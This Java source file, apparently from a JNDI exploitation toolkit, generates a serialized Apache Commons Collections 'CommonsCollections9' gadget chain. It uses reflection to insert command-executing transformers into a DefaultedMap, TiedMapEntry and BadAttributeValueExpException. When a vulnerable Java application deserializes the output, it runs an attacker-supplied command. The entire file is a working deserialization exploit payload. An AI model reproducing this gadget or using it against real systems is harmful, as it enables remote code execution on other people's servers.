package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections9 {

    public static byte[] getBytes(PayloadType type) throws Exception {
        String                        command            = String.valueOf(type);
        String[]                      execArgs           = {command};
        Class                         c                  = (execArgs.length > 1) ? String[].class : String.class;
        ChainedTransformer            chainedTransformer = new ChainedTransformer(new Transformer[]{(Transformer) new ConstantTransformer(Integer.valueOf(1))});
        Transformer[]                 transformers       = TransformerUtil.makeTransformer(command);
        Map<Object, Object>           innerMap           = new HashMap<Object, Object>();
        Map                           defaultedmap       = DefaultedMap.decorate(innerMap, (Transformer) chainedTransformer);
        TiedMapEntry                  entry              = new TiedMapEntry(defaultedmap, "nu1r");
        BadAttributeValueExpException val                = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(val, "val", entry);
        Reflections.setFieldValue(chainedTransformer, "iTransformers", transformers);

        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(val);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
